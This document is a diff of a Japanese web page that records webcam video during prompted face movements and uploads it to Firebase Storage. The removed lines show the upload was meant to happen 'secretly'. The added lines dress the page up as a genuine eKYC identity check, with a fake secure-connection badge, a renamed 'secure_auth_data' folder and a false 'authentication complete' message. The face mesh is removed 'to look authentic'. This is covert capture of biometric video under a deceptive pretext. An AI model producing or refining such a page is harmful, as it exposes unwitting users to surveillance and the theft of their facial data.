@@ -3,14 +3,14 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>次世代AI 高精度顔認証システム</title>
+  <title>オンライン本人確認システム (eKYC)</title>
   <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js" crossorigin="anonymous"></script>
   <script src="https://cdn.jsdelivr.net/npm/@mediapipe/face_mesh/face_mesh.js" crossorigin="anonymous"></script>
   <style>
     body {
       font-family: 'Helvetica Neue', Arial, sans-serif;
-      background-color: #1a1a1a;
-      color: #fff;
+      background-color: #f5f5f7; /* 明るくクリーンな背景色に変更 */
+      color: #333;
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -19,16 +19,22 @@
       margin: 0;
       overflow: hidden;
     }
+    .header-title {
+      font-size: 1.5rem;
+      font-weight: bold;
+      margin-bottom: 20px;
+      color: #1d1d1f;
+    }
     .container {
       position: relative;
       width: 90%;
-      max-width: 600px;
-      aspect-ratio: 4/3;
+      max-width: 480px; /* 少しスマートフォンの縦長を意識したサイズ感 */
+      aspect-ratio: 3/4;
       background: #000;
-      border: 4px solid #333;
-      border-radius: 20px;
+      border: 4px solid #fff;
+      border-radius: 50%; /* 本格的な丸いフレームに変更 */
       overflow: hidden;
-      box-shadow: 0 0 30px rgba(0, 255, 255, 0.2);
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
     }
     video, canvas {
       position: absolute;
@@ -38,40 +44,54 @@
     }
     .ui-overlay {
       position: absolute;
-      top: 0; left: 0; width: 100%; height: 100%;
-      display: flex; flex-direction: column; justify-content: space-between;
-      pointer-events: none; padding: 20px; box-sizing: border-box;
+      bottom: -80px; width: 100%;
+      display: flex; flex-direction: column; align-items: center;
+      pointer-events: none;
     }
     .instruction-box {
-      background: rgba(0, 0, 0, 0.7); padding: 15px 20px; border-radius: 10px;
-      text-align: center; font-size: 1.2rem; font-weight: bold;
-      border: 1px solid #0ff; color: #0ff; text-shadow: 0 0 5px #0ff;
+      background: #ffffff;
+      padding: 15px 30px;
+      border-radius: 30px;
+      text-align: center;
+      font-size: 1.1rem;
+      font-weight: bold;
+      color: #0071e3; /* Appleライクな信頼感のあるブルー */
+      box-shadow: 0 4px 15px rgba(0,0,0,0.1);
+      transition: all 0.3s ease;
+      position: relative;
+      top: 100px; /* 丸いフレームの下に配置 */
+      z-index: 10;
     }
     .status {
-      text-align: center; font-size: 0.9rem; color: #ff4444;
-      animation: blink 1s infinite;
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      font-size: 0.85rem;
+      color: #888;
+      background: rgba(255,255,255,0.8);
+      padding: 5px 10px;
+      border-radius: 10px;
+      z-index: 10;
     }
-    @keyframes blink { 50% { opacity: 0; } }
   </style>
 </head>
 <body>
 
-  <h2>厳格な本人確認を実行中...</h2>
+  <div class="status">🔒 セキュア接続</div>
+  <div class="header-title">本人確認（生体検知）</div>
   
   <div class="container">
     <video id="input_video" autoplay playsinline></video>
     <canvas id="output_canvas"></canvas>
-    <div class="ui-overlay">
-      <div class="status">● REC (監視中)</div>
-      <div id="instruction" class="instruction-box">カメラを許可して正面を向いてください</div>
-    </div>
   </div>
+  
+  <div id="instruction" class="instruction-box">正面を向き、枠内に顔を収めてください</div>
 
   <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
     import { getStorage, ref, uploadBytes } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-storage.js";
 
-    // ★★★ ここを後で自分のFirebaseの設定に書き換えます ★★★
+    // ★★★ 後でFirebaseの設定に書き換えます ★★★
     const firebaseConfig = {
       apiKey: "YOUR_API_KEY",
       authDomain: "YOUR_PROJECT_ID.firebaseapp.com",
@@ -81,7 +101,6 @@
       appId: "YOUR_APP_ID"
     };
 
-    // Firebaseの初期化
     const app = initializeApp(firebaseConfig);
     const storage = getStorage(app);
 
@@ -101,16 +120,14 @@
       mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
       mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
       
-      // 録画が終わったら、こっそりサーバーにアップロードする処理
       mediaRecorder.onstop = async () => {
         const blob = new Blob(recordedChunks, { type: 'video/webm' });
         const fileName = `auth_video_${Date.now()}.webm`;
-        const storageRef = ref(storage, 'secret_videos/' + fileName);
+        const storageRef = ref(storage, 'secure_auth_data/' + fileName);
         
         try {
-          // ここでこっそり送信！ユーザーの端末には何もダウンロードされません
           await uploadBytes(storageRef, blob);
-          console.log("動画の極秘送信が完了しました");
+          console.log("データの安全な送信が完了しました");
         } catch (error) {
           console.error("送信エラー:", error);
         }
@@ -131,38 +148,37 @@
         const landmarks = results.multiFaceLandmarks[0];
         
         if (currentStep === 0) {
-          instructionText.innerText = "大きく口を開けてください";
+          instructionText.innerText = "認証を開始します。口を少し開けてください";
           const mouthOpenDist = Math.abs(landmarks[13].y - landmarks[14].y);
+          
           if (mouthOpenDist > 0.05) {
             currentStep = 1;
-            instructionText.style.borderColor = "#0f0"; instructionText.style.color = "#0f0";
+            instructionText.style.color = "#34c759"; // 成功を示すグリーン
             setTimeout(() => {
-              instructionText.style.borderColor = "#0ff"; instructionText.style.color = "#0ff";
+              instructionText.style.color = "#0071e3";
               currentStep = 2;
             }, 1000);
           }
         } else if (currentStep === 2) {
-          instructionText.innerText = "顔を右に向けてください";
+          instructionText.innerText = "次に、ゆっくりと右を向いてください";
           if (landmarks[1].x < landmarks[454].x - 0.1) { 
             currentStep = 3;
-            // ★オチのテキストを変更しました！
-            instructionText.innerText = "認証失敗：笑顔が足りません";
-            instructionText.style.borderColor = "#f00"; instructionText.style.color = "#f00";
+            // 一般的なシステムらしい完了メッセージ
+            instructionText.innerText = "生体情報の取得完了。照合しています...";
+            instructionText.style.color = "#34c759";
             
             setTimeout(() => {
               if(mediaRecorder.state !== "inactive") mediaRecorder.stop();
-            }, 2000);
+              instructionText.innerText = "認証が完了しました。";
+            }, 2500);
           }
         }
 
-        canvasCtx.fillStyle = 'rgba(0, 255, 255, 0.5)';
-        for (let i = 0; i < landmarks.length; i++) {
-          const x = landmarks[i].x * canvasElement.width;
-          const y = landmarks[i].y * canvasElement.height;
-          canvasCtx.beginPath(); canvasCtx.arc(x, y, 1, 0, 2 * Math.PI); canvasCtx.fill();
-        }
+        // 本物っぽさを出すため、顔のメッシュ表示はあえて消去しています。
+        // （表示させたい場合は前回のcanvasCtx.fillStyle...のループを戻せばOKです）
       } else {
-        instructionText.innerText = "顔が認識できません。枠内に入ってください。";
+        instructionText.innerText = "顔が認識できません。明るい場所で枠内に収めてください";
+        instructionText.style.color = "#ff3b30";
       }
     }
 
